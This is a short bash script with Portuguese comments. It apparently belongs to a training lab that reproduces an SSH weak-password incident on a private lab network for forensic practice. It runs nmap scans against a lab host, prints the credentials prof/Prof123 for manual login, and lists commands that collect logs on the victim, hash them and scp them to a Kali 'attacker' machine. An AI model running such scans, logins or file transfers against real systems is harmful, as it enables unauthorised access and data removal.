#!/bin/bash
# Dia 3 - Reprodução do Incidente (executar na ATACANTE)

echo "=== INICIANDO REPRODUÇÃO DO INCIDENTE ==="
echo "Data/Hora: $(date -Iseconds)"

# Reconhecimento
echo "1. Reconhecimento da vítima..."
nmap -sS -sV -p 22 192.168.56.10 | tee /tmp/nmap_scan.txt
nmap --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -p 22 192.168.56.10 | tee /tmp/nmap_ssh_enum.txt

# Tentativa de acesso (senha fraca)
echo "2. Tentativa de acesso SSH..."
echo "Usando credenciais: prof/Prof123"

# Simular acesso (manual - executar interativamente)
echo "Execute manualmente:"
echo "ssh prof@192.168.56.10"
echo "Senha: Prof123"
echo ""
echo "Após acesso, executar na vítima:"
echo 'echo "touch_by_incident_demo $(date -Iseconds)" | sudo tee /opt/recurso_demo.log'

# Preparar coleta de evidências
echo "3. Preparando coleta de evidências..."
mkdir -p /tmp/evidence_collection

echo "=== COMANDOS PARA EXECUTAR NA VÍTIMA APÓS ACESSO ==="
cat << 'EOF'
# Coletar logs imediatamente
sudo journalctl -u ssh -S -2h > /tmp/ssh.log
last -F > /tmp/last.log
who -a > /tmp/who.log
id > /tmp/id.log
ip a > /tmp/ipa.log
ps auxf > /tmp/processes.log

# Gerar hashes
sha256sum /tmp/*.log | tee /tmp/logs.sha256

# Copiar para atacante (executar na vítima)
scp /tmp/*.log /tmp/logs.sha256 kali@192.168.56.20:/tmp/evidence_collection/
EOF

echo "=== FIM DO SCRIPT - EXECUTE OS COMANDOS MANUALMENTE ==="